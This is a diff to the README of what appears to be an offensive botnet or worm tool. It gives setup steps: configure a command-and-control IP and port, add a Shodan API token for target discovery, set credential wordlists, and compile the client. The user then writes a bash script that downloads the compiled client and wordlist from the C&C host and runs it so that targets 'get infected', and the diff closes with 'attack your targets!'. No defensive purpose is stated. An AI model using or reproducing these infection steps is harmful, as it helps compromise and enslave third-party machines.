@@ -19,14 +19,18 @@
 
 1. download the project
 
-2. configure the cnc_ip on client.py and server.py
+2. configure the cnc ip and cnc port on client.py and server.py
 
 3. add shodan api token
 
-4. create an installation file to make the target get infected and configure it on server.py and client.py
+4. configure the wordlist in client.py and configure the wordlist length in server.py
+
+5. create an installation file to make the target get infected and configure it on server.py and client.py
 for example:
 
-use a python compiler to compile client.py then create the bash script that downloads the compiled file and runs it:
+use a python compiler to compile client.py
+
+then create a bash script that downloads the used wordlist, the compiled client and runs the client:
 ```
 #!/bin/bash
 cnc_ip="your cnc"
@@ -39,7 +43,7 @@ chmod 777 $executable
 ```
 configure the bash file name under executable in server.py and client.py
 
-5. run the server.py and attack your targets!
+6. run the server.py and attack your targets!
 
 **Attack example:**
 
